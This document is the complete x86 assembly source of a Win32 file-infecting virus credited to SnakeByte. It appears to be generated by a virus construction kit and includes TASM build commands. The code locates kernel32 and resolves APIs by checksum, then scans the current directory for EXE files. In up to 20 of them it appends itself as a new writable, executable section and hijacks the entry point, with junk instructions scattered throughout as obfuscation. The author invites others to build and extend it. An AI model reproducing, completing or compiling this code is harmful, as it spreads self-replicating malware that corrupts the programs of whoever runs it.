              
;
;
; Win32.20 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.20
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 20
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 10
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 inc esp
 shl edx, 29d                           ; Trash
 add esp, 3d
 mov eax, dword ptr [esp-4]
 sub eax, offset Delta
                                        ; mov ebp, eax
                                        ; clear ebp
 mov ebp, 0
 add ebp, eax
 jmp KernelSearchStart
 xor ecx, ebx                           ; Trash


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 or edx, 24287504d                      ; Trash
 mov edx, 80000000h or 40000000h
 push edx
 lea edx, [ebp+WFD_szFileName]
 xchg ebx, edx

 push ebx
 call dword ptr [ebp+XCreateFileA]
 and dword ptr [ebp+Trash1], ecx        ; Trash

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 shl edx, 29d                           ; Trash
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz CloseFile
                                        ; clear ecx
 sub ecx, ecx
 push ebx
 push ecx
 push ecx
                                        ; mov edx, 2
 mov edx, ( 2d + 31d )
 sub edx, 31d
 push edx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 inc dword ptr [ebp+Trash1]             ; Trash
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 Trash2      dd 0h
 sectionalign   dd 0h
 AlignReg2   dd 0h

 APINames:
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

 AlignTemp   dd 0h
 TempApisearch3 dd 0h
 Trash1      dd 0h
 FileHandle  dd 0h
 TempApisearch2 dd 0h
 db 'Win32.20 of SnakeByte',0
 OldEIP      dd 0h
 ATableVA    dd 0h
 InfCounter  dd 0h

 NewEIP      dd 0h
 OldBase     dd 400000h
 NewSize     dd 0h
 counter     dw 0h
 TempAPI     dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FindHandle  dd 0h
 PEheader    dd 0h
 OTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Attributes  dd 0h
 MapHandle   dd 0h
 filemask    db '*.EXE',0

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h

 filealign   dd 0h
 MapAddress  dd 0h
 AlignReg1   dd 0h
 Misc1       dd 0h
 KernelPE    dd 0h
 NTableVA    dd 0h
 KernelMZ    dd 0h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add ebx, 63321747d                     ; Trash
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]

 neg eax                                ; Trash

Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov ecx, offset filemask
 add ecx, ebp

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
 add edx, eax                           ; Trash
                                        ; Check Infection Counter
                                        ; clear ecx
 and ecx, 0
 xor ecx, dword ptr [ebp+InfCounter]
                                        ; add ecx, 1
 inc ecx
 dec ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 inc edx                                ; Trash
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop eax
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
                                        ; mov edx, 4
 mov edx, 0
 add edx, 4d
 sub esp, edx
                                        ; round to pages
 ror esi, 16d
 shl esi, 16d
                                        ; add esi, 1
 sub esi, -1d
GetKernelLoop:
                                        ; clear edx
 push 0
 pop edx
 sub esi, 1
 mov dx, word ptr [esi+03ch]
 test dx,0f800h
 jnz GetKernelLoop
 cmp esi, dword ptr [esi+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], esi
 mov edx, [esi+3Ch]
 add ebx, ecx                           ; Trash
 add edx, esi
 mov [KernelPE+ebp], edx

 jmp GetApis

;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, 276d
 lea eax, [ebp+WFD_szFileName]
 add ecx, edx                           ; Trash


ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 inc eax
 dec edx
 jnz ClearOldData2
 popad
ret
 or ebx, 51853723d                      ; Trash


FindNextFileProc:                       ; find another file
 dec eax                                ; Trash
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 xor edx, edx                           ; Trash
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push ebx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx

 mov ecx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], ecx

 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edx



                                        ; number of API's we're looking for
                                        ; clear edx
 mov edx, 45437d
 sub edx, 45437d
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APINames]
 xchg eax, ebx
 or ecx, eax                            ; Trash

 lea esi, [ebp+APIOffsets]
 mov dword ptr [ebp+Trash1], 1309253    ; Trash


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h
 or ecx, 17557289d                      ; Trash

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 add ebx, 4d
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 inc esi
 xor ecx, 26361151d                     ; Trash
 add esi, 3d
 sub edx, 1
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop ecx
                                        ; retrieve PE - Header
 mov ebx, ecx
 add ebx, [ecx+3Ch]
                                        ; get File Alignment
 mov eax, [ebx+3Ch]
 mov dword ptr [ebp+filealign], 0
 add dword ptr [ebp+filealign], eax
                                        ; mov esi, -1
 mov esi, ( -1d xor 36d )
 xor esi, 36d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 push eax
 pop dword ptr [ebp+PEheader]
                                        ; get old Entrypoint
 mov ebx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ebx
 mov ecx, dword ptr [eax+34h]
 push ecx
 pop dword ptr [ebp+OldBase]
 mov ebx, [eax+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov edx, [eax+74h]
 shl edx, 3
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [eax+6h]
 mov ebx, 28h
 pushad
 mov eax, ecx
 mul ebx
 push eax
 pop dword ptr [ebp+Misc1]
 popad
 mov ecx, dword ptr [ebp+Misc1]
 shr ebx, 11d                           ; Trash
 add eax, 78h
 add eax, edx
 add eax, ecx
 lea ebx, [ebp+newsection]


 xchg ebx, eax
 push ebx
                                        ; Calculate the RVA of the new section
 mov edx, [ebx-5*8+8d]
 add edx, [ebx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], 0
 sub eax, edx                           ; Trash
 add dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], 0
 add dword ptr [ebp+nsphysicalsize], edx
 Call Align
                                        ; clear ecx
 mov ecx, 61828d
 sub ecx, 61828d
 xor ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 push VirusSize
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], eax
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ebp+nsvirtualsize], 0
 xor dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov edx,[ebx-5*8+20d]
 add edx,[ebx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 push edx
 xor eax, ebx                           ; Trash
 pop dword ptr [ebp+AlignReg1]
 push ecx
 pop dword ptr [ebp+AlignReg2]
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
 mov dword ptr [ebp+nsphysicaloffset], eax
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop ecx
 mov ebx, eax
 add ebx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ebx
 or eax, ecx                            ; Trash
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; mov eax, 16
 mov eax, 0
 add eax, 16d
 lea edx, [ebp+newsection]

 pop ebx
WriteNewSectionLoop:
 push dword ptr [edx]
 pop dword ptr [ebx]
                                        ; add edx, 4
 dec edx
 add edx, 5d
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 sub eax, 1
 test eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 push dword ptr [ebp+PEheader]
 pop edx
 sub word ptr [edx+06h], -1
 mov ecx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], ecx
                                        ; set new EIP
 mov dword ptr  [edx+28h], ecx
                                        ; set infection mark
 mov dword ptr [edx+4Ch], '20'
                                        ; clear ebx
 mov ebx, 47171d
 sub ebx, 47171d
 xor ebx, dword ptr [ebp+nsphysicaloffset]
 push ebx
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop eax
 sub eax, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edi
 and edi, 0
 add edi, [eax+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 dec edi
 add edi, 29d
                                        ; get ATableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get NTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 sal edx, 21d                           ; Trash
 mov dword ptr [ebp+NTableVA], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get OTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 ror eax, 3d                            ; Trash
 push edx
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
                                        ; mov edx, ecx
 mov edx, ecx
                                        ; mov esi, edx
 mov esi, edx
 mov dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], 0
 xor dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [ebx]
 pop ecx
 LoopChsksm:
                                        ; clear eax
 mov eax, -27432d
 add eax, 27432d
 mov al, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 shl ax,8d
 mov dword ptr [ebp+Trash1], ecx        ; Trash
 sub ecx, eax
 cmp ax, 0
 je LoopConti
                                        ; clear eax
 mov eax, 12107d
 sub eax, 12107d
 mov al, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 sub ecx, eax
 cmp ax, 0
 jne LoopChsksm
LoopConti:
                                        ; add ecx, 1
 inc ecx
 dec ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edx
 mov ebx, dword ptr [ebp+TempApisearch3]
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; add edx, 4
 add edx, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear ecx
 sub ecx, ecx
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov eax, ecx
 movzx ecx, word ptr [eax]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; mov eax, -1
 mov eax, ( -1d + 30d )
 sub eax, 30d
 and eax, dword ptr [ebp+KernelMZ]
 mov edx, ecx                           ; Trash
 add eax, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

 sub dword ptr [ebp+Trash1], eax        ; Trash
InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 rol edx, 14d                           ; Trash
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; check for minimum filesize
                                        ; mov ecx, -1
 mov ecx, ( -1d + 38d )
 sub ecx, 38d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ecx, offset WFD_szFileName
 add eax, 32106243d                     ; Trash
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea eax, [ebp+WFD_szFileName]
 xchg edx, eax


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx eax, word ptr [ebx]
 xor eax, 'ZM'
 jz Goodfile
                                        ; mov ecx, 15840
 mov ecx, 15840d
 cmp ecx, 15840d
 and dword ptr [ebp+Trash1], 1500039    ; Trash
 je Notagoodfile

Goodfile:
 sal edx, 21d                           ; Trash
 cmp word ptr [ebx+3Ch], 0h
 je Notagoodfile
                                        ; clear ecx
 mov ecx, 56083d
 sub ecx, 56083d
 add ecx, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, ebx
                                        ; check for PE Header
                                        ; check for EP
 movzx edx, word ptr [ecx]
 xor edx, 'EP'
 jz Goodfile2
                                        ; mov eax, 10430
 mov eax, ( 10430d + 5d )
 sub eax, 5d
 cmp eax, 10430d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '20'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov dx, word ptr [ecx+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 adc edx, eax                           ; Trash
                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 xor dword ptr [ebp+Trash1], ecx        ; Trash
 lea edx, [ebp+WFD_szFileName]
 xor dword ptr [ebp+Trash1], 928798     ; Trash

 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 adc dword ptr [ebp+Trash1], 778224     ; Trash
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edx
 sbb ecx, 27d                           ; Trash

                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



CryptEnd:
 not eax                                ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

